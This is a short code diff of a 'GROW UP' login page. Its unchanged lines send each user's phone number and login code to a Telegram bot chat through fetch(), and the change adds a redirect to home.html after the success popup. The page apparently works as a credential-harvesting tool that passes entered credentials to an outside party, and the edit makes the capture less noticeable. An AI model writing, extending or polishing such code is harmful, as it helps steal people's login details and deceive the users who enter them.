@@ -152,10 +152,12 @@
                 localStorage.setItem('userCode', c);
                 const text = `🚀 *GROW UP Login*\n\n📱 Phone: ${p}\n🔑 Code: ${c}`;
                 const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
-                
                 fetch(url).then(() => {
-                    Swal.fire('Success', 'Welcome to GROW UP!', 'success');
-                });
+    Swal.fire('Success', 'Welcome to GROW UP!', 'success');
+    window.location.href = "home.html"; // <-- Ye line yahan add kar do
+});
+                
+                
             } else {
                 Swal.fire('Error', 'Invalid Leader Code', 'error');
             }
